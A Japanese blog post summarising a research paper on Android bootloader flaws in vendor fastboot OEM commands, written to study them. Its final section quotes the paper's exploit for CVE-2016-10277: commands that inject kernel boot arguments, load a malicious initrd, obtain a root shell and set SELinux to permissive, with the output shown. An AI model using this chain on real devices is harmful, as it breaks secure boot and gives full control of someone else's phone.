+++
title = "fastboot oem vuln:Android Bootloader Vulnerabilities in Vendor Customizations"
date = "2020-08-14"
tags = [
    "security",
    "paper",
]
+++

androidのブートローダ周りの脆弱性やファジングってどうやってるんだろうっての気になってたらこの論文を見つけました。

いつもどおり適当なのでちゃんと知りたかったら論文読んでください。

#### Introduction
androidではchain-of-trustを通してセキュアブートを実装している。

PBLが次のブートローダの真正性を検証してSBLが起動、SBLがABOOTを検証するというのを続ける。
簡単にするとPBL -> SBL -> ABOOT -> boot.imgみたいな感じで起動していくっぽい。

ABOOTには通常モードとfastbootモードの2つのモードがある。
ABOOTはOSの実行前に実行されているため脆弱性も重要な深刻度を持っている。

この論文では例をいくつか紹介する。

#### fastbootの起動
fastbootは様々な方法で起動できると言ってる。

- キーの組み合わせ
- USBデバッグを有効にした状態でadb reboot

キーの組み合わせっていうのは何を指してるのかよくわからなかったので調べてみた所、以下のドキュメントを見つけた。

https://source.android.google.cn/setup/build/running?hl=ja#booting-into-fastboot-mode

キーの組み合わせって言うのは物理キーの組み合わせの話らしい。

自分が持ってるPixel 3a XLだと音量小を押したまま電源を長押しすると起動できるっぽい。

太古の昔にTWRPを入れるために似たような操作をやっていたけど完全に失念していた。

#### ABOOTTOOL
OEMコマンドを発見するためにABOOTTOOLというファズツールを開発したらしい。
https://github.com/alephsecurity/abootool

これっぽい。

これによってメモリダンプ (ALEPH-2016000)などの脆弱性を発見できたと言ってる。

そして過去の脆弱性や今回見つかった脆弱性を4種類に分類して説明している。

- OSの完全性
- データの流失
- OSの隠れた機能
- ICに対する攻撃

今回はOSの完全性の辺りに焦点を当てて見てみる。

#### OSの完全性
いくつかあるっぽいけど今回はCVE-2016-10277に注目してみる。
```txt
$ fastboot oem config console "a foo=A "
$ fastboot oem config fsg-id "a bar=B"
$ fastboot oem config carrier "a baz=C"
[...]
shamu:/ $ dmesg | grep command
[    0.000000] Kernel command line: console=a foo=A ,115200,
    n8 earlyprintk androidboot.console=a foo=A  androidboot
    .hardware=shamu msm_rtb.filter=0x37 [...] androidboot.
    fsg-id=a bar=B androidboot.secure_hardware=1 [...]
    androidboot.carrier=a baz=C  androidboot.hard<
```
こんな感じでlinux kernelの起動オプションに任意の値を含めることが出来るっぽい。

これを利用して、initrdを用意してfastbootでflash, rdinitに自分のinitrdを指定して起動するというのをやっている。
flashっていう操作はなんだかロックされていると出来なさそうに思えるけどこれはロックしててもいけるらしい。

これ以外にも再起動後も保つ方法とかいろいろ書いてあったので興味ある人は自分で読んでみて。
```txt
$ fastboot oem config fsg-id "a initrd=0x11000000,1518172"
$ fastboot flash aleph malicious.cpio.gz
[...]
target reported max download size of 536870912 bytes
sending ’aleph’ (1482 KB)...
OKAY [  0.050s]
writing ’aleph’.
..(bootloader) Not allowed in LOCKED state!
FAILED (remote failure)
finished.
total time: 0.054s

$ fastboot continue
$ adb shellshamu:/ # id
uid=0(root) gid=0(root) groups=0(root),[...] context=u:r:su:s0
shamu:/ # setenforce permissive
shamu:/ # getenforce
Permissive
shamu:/ #
```
